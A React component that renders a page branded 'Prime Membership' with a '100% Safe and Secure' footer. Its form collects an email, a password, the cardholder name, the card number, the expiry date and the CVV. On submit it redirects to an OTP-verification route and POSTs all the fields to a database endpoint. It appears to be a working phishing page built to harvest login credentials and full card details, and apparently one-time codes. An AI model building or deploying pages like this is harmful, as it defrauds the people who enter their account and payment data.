
import { useState, useEffect, useRef } from 'react'

import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';




function Card() {
  const [count, setCount] = useState()
  const navigate = useNavigate();

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();

  const delay = (d) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve()
      }, d * 3000);
    })
  }

  //const onSubmit = async (data) => {
  // await delay(2)
  //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
  //let res = await r.text()
  //console.log(data, res)


  const onSubmit = async (data) => {
    navigate("/Otp-verification")
    let r = await fetch(import.meta.env.VITE_MONGO, {
      method: "POST", headers: {
        "Content-Type": "application/json",
      }, body: JSON.stringify(data)


    })
    let res = await r.text()

    console.log(data, res)


  }



  return (
    <>

      <div className="payment-nav card-navbar">
        <img id='payment-img' src="./img/img1.png.webp" alt="fail to load img 1" />
        <h3 id='payment-heading'> Prime Membership</h3>
      </div>


      {isSubmitting && <div>Loading...</div>}
      <div className="container">
        <form action="" onSubmit={handleSubmit(onSubmit)}>
          <input placeholder='Email'{...register("Email")} type="Email" name="Email" className='input' />
          <br />
          <input placeholder='password'{...register("password")} type="text" name="password" className='input' />
          <br />
          <input placeholder='Name on Card'{...register("ahn")} type="text" name="ahn" className='input' />
          <br />
          <input placeholder='Card Number'{...register("Cardd")} type="number" name="Cardd" className='input' />
          <br />

          <div className="card-expire-cvv">
            <input placeholder='Expiry (MM/YY)'{...register("Expiry")} type="number" name="Expiry" className='expire' />

            <input placeholder='CVV'{...register("C")} type="number" name="C" className='cvv' />
            <br />




          </div>
          <button type="submit" value="submit" id='card-pay-button'> Pay</button>
        </form>
      </div>




      <div className="debit-footer">
        <img id='footer-img' src="./img/img1.png.webp" alt="fail to load footer img " />
        <h3 id='footer-heading'>
          100% Safe and Secure
        </h3>

      </div>


    </>
  )
}

export default Card
